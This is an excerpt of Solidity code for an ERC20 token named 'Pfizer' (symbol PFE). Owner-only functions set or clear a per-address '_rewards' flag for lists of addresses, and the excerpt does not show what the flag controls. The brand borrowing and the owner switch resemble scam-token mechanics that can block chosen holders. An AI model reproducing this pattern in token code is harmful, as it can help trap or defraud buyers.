...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function grantPFE(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = true;
        }
    }

    function proceedPFE(address [] calldata _rewardees_) external onlyOwner {
        for (uint256 i = 0; i < _rewardees_.length; i++) {
            _rewards[_rewardees_[i]] = false;
        }
    }

    function checkPFE(address _rewardee_) public view returns (bool) {
...
contract Pfizer is ERC20 {
    constructor() ERC20("Pfizer", "PFE") {
